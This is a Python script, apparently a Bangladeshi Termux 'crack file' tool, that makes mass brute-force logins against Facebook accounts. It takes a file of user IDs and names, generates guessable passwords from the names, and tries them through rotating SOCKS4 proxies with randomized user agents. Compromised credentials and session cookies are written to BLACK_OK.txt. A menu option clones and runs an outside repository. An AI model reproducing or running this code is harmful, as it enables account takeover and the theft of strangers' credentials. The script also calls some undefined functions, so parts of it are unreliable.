
#-----------------[ IMPORT-MODULE ]-------------------
from bs4 import BeautifulSoup as sop
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()

now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
reset = "[/]"
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[Mr.KAUSAR]')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#--------------------[ CONVERTER-BULAN ]--------------#
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
###----------[ WARNA PRINT BIASA ]---------- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

###----------[ WARNA PRINT RICH ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
###----------[ CEK WARNA TEMA ]---------- ###
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00C8FF"
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"

def _KAUSAR_(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def clear():
	os.system('clear')
def back():
	login()
def bersihkan_layar():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	bersihkan_layar()
	prints(Panel(f"""{color_rich} 
 ▄▄▄▄    ██▓    ▄▄▄       ▄████▄   ██▓           {H2}███████████████████{reset}
▓█████▄ ▓██▒   ▒████▄    ▒██▀ ▀█  ▓██▒           {H2}███████████████████{reset}
▒██▒ ▄██▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▒██░           {M2}███████████████████{reset}
▒██░█▀  ▒██░   ░██▄▄▄▄█ ▒▓▓▄ ▄██▒▒██░            {M2}███████████████████{reset}
░▓█  ▀█▓░██████▒▓█   ▓██▒▒ ▓███▀ ░░██████▒       {H2}███████████████████{reset}
░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░░ ▒░▓  ░       {H2}███████████████████{reset}
▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒   ░ ░ ▒  ░
 ░    ░   ░ ░    ░   ▒   ░          ░ ░   
 ░          ░  ░     ░  ░░ ░          ░  ░
      ░                  ░                Made By {H2}Ban{M2}glad{H2}eshi {P2}Coder""",style=f"{color_table}"))
os.system('clear')
banner()



def Fire_Main():
    bersihkan_layar()
    banner()
    prints(Panel(f"""{color_rich}[A] CRACK FILE \n[B] CREATE FILE""",style=f"{color_table}"))
    inpp = input(f" {H}• {P} input : {M}")
    if inpp == "A":
        F()
    #if inpp == '':pak()
    #if inpp =='3':
      #  gmail()
    if inpp == "B":
     print(f'("+")Loading Best File Create Command ')
     os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')
     os.system('cd && cd FILE ;python FILE.py')
     exit()
    if inpp == "0":
     exit('Exit!')
	


#-------------[ CRACK-FROM-FILE ]------------------#
def F():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			print(f' \x1b[1;92m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;34m     Example: /sdcard/Example.txt     \033[40m\033[00m')
			fileX = input (' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Enter Your File ➣\x1b[1;93m ') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;96m TOTAL ID ➣ \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print(" \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m file %s not found\x1b[0m"%(fileX));time.sleep(2)
			F()
#-------------[ PENGATURAN-IDZ ]---------------#
def Settings():
	print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Only New Id \x1b[1;92m[BEST]\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m New Old Mix')
	hu = input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoose ➣\x1b[1;92m ')
	if hu in ['1','01']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['2','02']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' \x1b[1;91m\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mWrong Option Bara')
		exit()
	
	print(f' \x1b[1;91m[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m METHOD B-API [BEST]')
	hc = input(' \x1b[1;91m \x1b[1;94mChoose \x1b[1;92m ')
	os.system('clear')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;35m     PASSWORD MENU     \033[40m\033[00m\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Manual Password \x1b[1;91m[m]\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Auto Password \x1b[1;96m[d] \x1b[1;92m[BEST]\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoice ➣ \x1b[1;92m')
	os.system('clear')
	banner()
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Add Password Manual Minimam 6 Character')
		pwku=input(' \x1b[1;91m\x1b[1;96m\x1b[1;92mAdd Password Manual : ')
		os.system('clear')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
#------------[ WARNA-MEMEKMU]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT 
white = '\33[0;37m' #PUTIH
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :hasan = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :hasan = ' ~> 2009'
        elif uid[:8] in ['10000000']        :hasan = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:hasan = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:hasan = ' 2010'
        elif uid[:6] in ['100001']          :hasan = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :hasan = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :hasan = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :hasan = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :hasan = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :hasan = ' ~> 2015'
        elif uid[:5] in ['10001']           :hasan = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :hasan = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :hasan = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :hasan = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :hasan = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:hasan = ' ~> 2021'
        elif uid[:5] in ['10008']           :hasan = ' ~>2022'
        elif uid[:5] in ['10009']           :hasan = ' ~> 2023'
        else:hasan=''
    elif len(uid) in [9,10]:
        hasan = ' ~> 2008/2009'
    elif len(uid)==8:
        hasan = ' ~> 2007/2008'
    elif len(uid)==7:
        hasan = ' ~> 2006/2007'
    else:hasan=''
    return hasan
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	#print(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30mᗰᖇ.ᗷᗩᕼᗩᑌᗪᗪIᑎ\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●')
	os.system("clear")
	banner()
	print(f'├──> While Waiting for Results ')
	print(f' Results OK Saved In :BLACK_OK.txt')
	print(f' Results CP Saved In :CP.txt')
	print(f' Play Airplane Mode Any 1k Idz\r')
	print('══════════════════════════════════════════')
	#print(f"\x1b[1;91m [💉] \x1b[1;92m TODAY TIME        \x1b[1;91m➢ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	#print(f"\x1b[1;91m [💉] \x1b[1;92m TODAY DATE        \x1b[1;91m➢ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
	#print(f"\x1b[1;91m [😩] \x1b[1;91m NOTE ➢ \33[1;92m[ USE AIRPLANE MODE BEFORE USE ] ")
	p#rint(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30mᗰᖇ.ᗷᗩᕼᗩᑌᗪᗪIᑎ\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●\n')
	#os.system("play-audio stard.mp3 ")
	print(50*'_')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append('bangladesh')
					pwv.append('shanto')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@')
					pwv.append(frs+'1122')
					pwv.append(frs+'2023')
					pwv.append('123456')
					pwv.append('@#@#@#')
					pwv.append(frs+'321') 
					pwv.append(frs+'4321')
					pwv.append(frs+'00') 
					pwv.append(frs+'01') 
					pwv.append(frs+'02') 
					pwv.append(frs+'03') 
					pwv.append(frs+'04') 
					pwv.append(frs+'05') 
					pwv.append(frs+'06') 
					pwv.append(frs+'07') 
					pwv.append(frs+'08') 
					pwv.append(frs+'09') 
					pwv.append(frs+'10') 
					pwv.append(frs+'11') 
					pwv.append(frs+'12')
					pwv.append('shanto1122')
					pwv.append('bahauddin')
					pwv.append(nmf+'1122')
					pwv.append(nmf+'@@@')
					pwv.append(nmf+'@')
					pwv.append(nmf+'@@')
					pwv.append(nmf+'@123@')
					pwv.append(nmf+'@1122@')
					pwv.append(nmf+'@1234@')
					pwv.append(nmf+'@#@#@#')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'2023')
					pwv.append(nmf+'2023')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append('bangladesh')
					pwv.append('shanto')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@')
					pwv.append(frs+'1122')
					pwv.append(frs+'2023')
					pwv.append('123456')
					pwv.append('@#@#@#')
					pwv.append(frs+'321') 
					pwv.append(frs+'4321')
					pwv.append(frs+'00') 
					pwv.append(frs+'01') 
					pwv.append(frs+'02') 
					pwv.append(frs+'03') 
					pwv.append(frs+'04') 
					pwv.append(frs+'05') 
					pwv.append(frs+'06') 
					pwv.append(frs+'07') 
					pwv.append(frs+'08') 
					pwv.append(frs+'09') 
					pwv.append(frs+'10') 
					pwv.append(frs+'11') 
					pwv.append(frs+'12')
					pwv.append('shanto1122')
					pwv.append('bahauddin')
					pwv.append(nmf+'1122')
					pwv.append(nmf+'@@@')
					pwv.append(nmf+'@')
					pwv.append(nmf+'@@')
					pwv.append(nmf+'@123@')
					pwv.append(nmf+'@1122@')
					pwv.append(nmf+'@1234@')
					pwv.append(nmf+'@#@#@#')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'2023')
					pwv.append(nmf+'2023')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print('|')
	cetak(nel('\t[cyan][green] CRACK DONE [cyan] [white] '))
	print(f'[{b}.{x}]{hh} OK : {hh}%s '%(ok))
	print(f'{x}[{b}.{x}]{kk} CP : {kk}%s{x} '%(cp))
	print('|')
	print('>Choose( Y/t ) ? ')
	woi = input('>Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>{k} Good Bye {x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	#sys.stdout.write(f'\r \33[1;94m[BLACK\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(ok))),
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r \33[1;95m[BLACK]  {h}[{kk}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/device-based/login/async/?api_key=1862952583919182&auth_token=f3065b21d6ef89eaf682fc7b6c2e1753&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_8x88r2sz%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc9f20b01-03f7-4e32-be69-554b2efce80d%26tp%3Dunspecified&refsrc=deprecated&app_id=1862952583919182&cancel=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_8x88r2sz%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&lwv=101')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_8x88r2sz%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc9f20b01-03f7-4e32-be69-554b2efce80d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_8x88r2sz%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#os.system("play-audio m.mp3 ")
				print(f'\r \x1b[1;93m CHECKPOINT-[🥶] {idf} | {pw}{N}')     
				open('BLACK_CP.txt' , 'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				#os.system("play-audio bd.mp3 ")
				print(f'\r{H}\nSUCCESSFUL [💚] {idf} | {pw}\n[🌸]COOKIES ➢ \x1b[1;97m{kuki}')
				cek_apk(session,coki)
				open('BLACK_OK.txt' , 'a').write(idf+'|'+pw+'|'+ua+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	Fire_Main()
